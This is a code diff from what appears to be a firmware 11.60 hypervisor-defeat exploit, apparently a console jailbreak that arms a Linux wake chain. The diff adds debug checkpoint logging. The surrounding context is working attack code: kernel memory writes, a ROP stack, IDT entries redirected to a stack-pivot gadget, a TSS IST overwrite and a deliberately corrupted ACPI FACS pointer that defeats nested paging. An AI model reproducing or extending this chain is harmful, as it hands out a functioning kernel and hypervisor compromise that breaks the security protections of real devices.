@@ -81,6 +81,13 @@ _Static_assert(CAVE_AP_SOURCE_OFF + AP_COPY_SIZE <= CAVE_SAVE_OFF,
 _Static_assert(CAVE_STASH_OFF + 0x100 <= 0x4000,
                "result stash exceeds resume cave");
 
+static void checkpoint_1160_hv(const char *stage) {
+  if (fw != 0x1160)
+    return;
+  printf("11.60 checkpoint: hv_defeat: %s\n", stage);
+  fflush(stdout);
+}
+
 static uint64_t kg(uint64_t offset) { return ktext + offset; }
 
 static int offsets_present(void) {
@@ -534,6 +541,7 @@ int hv_defeat_1160(void *shellcode_kernel, size_t shellcode_kernel_len) {
   uint64_t zeroes[16] = {0};
   int rc;
 
+  checkpoint_1160_hv("validation begin");
   if (shellcode_kernel == NULL || !offsets_present()) {
     notify("11.60 offsets/raw firmware gate failed; refusing to arm\n");
     return -1;
@@ -546,6 +554,7 @@ int hv_defeat_1160(void *shellcode_kernel, size_t shellcode_kernel_len) {
     notify("11.60 wake blob does not fit the verified executable NOP cave\n");
     return -1;
   }
+  checkpoint_1160_hv("firmware, model, offsets, and wake cave validated");
 
   facs = kread64(kg(env_offset.ACPIGBL_FACS));
   if ((facs >> 48) != 0xffffULL) {
@@ -563,6 +572,7 @@ int hv_defeat_1160(void *shellcode_kernel, size_t shellcode_kernel_len) {
     notify("11.60 startup-AP carrier page is not executable\n");
     return -1;
   }
+  checkpoint_1160_hv("runtime preflight passed");
 
   sx_ist = pa_to_dmap(alloc_page());
   if (sx_ist == dmap || build_sx_rop(sx_ist, shellcode_kernel_len))
@@ -576,12 +586,15 @@ int hv_defeat_1160(void *shellcode_kernel, size_t shellcode_kernel_len) {
   kwrite(resume_cave + CAVE_ORACLE_OFF, zeroes, sizeof(zeroes));
   kwrite(resume_cave + CAVE_STASH_OFF, zeroes, sizeof(zeroes));
 
+  checkpoint_1160_hv("startup carrier arm begin");
   rc = arm_startup_carrier(resume_cave);
   if (rc) {
     notify("11.60 startup-AP carrier refused to arm (%d)\n", rc);
     return -1;
   }
+  checkpoint_1160_hv("startup carrier arm complete");
 
+  checkpoint_1160_hv("final IST7/IDT/FACS mutations begin");
   kwrite64(kg(env_offset.COMMON_TSS) + TSS_IST(7), sx_ist + 0x1000);
   setidt(13, kg(env_offset.GAD_PIVOT_ADD_RSP28_RET), 7);
   setidt(30, kg(env_offset.GAD_PIVOT_ADD_RSP28_RET), 7);
@@ -589,6 +602,7 @@ int hv_defeat_1160(void *shellcode_kernel, size_t shellcode_kernel_len) {
   /* Matches Sonic: corrupt the FACS pointer so the stock wake path reaches
    * the #GP/#SX copy-and-transfer chain after NPT has been disabled. */
   kwrite64(kg(env_offset.ACPIGBL_FACS), kg(env_offset.ACPIGBL_FACS) - 8);
+  checkpoint_1160_hv("final IST7/IDT/FACS mutations complete");
 
   notify("11.60 Sonic-style Linux wake chain armed\n");
   return 0;
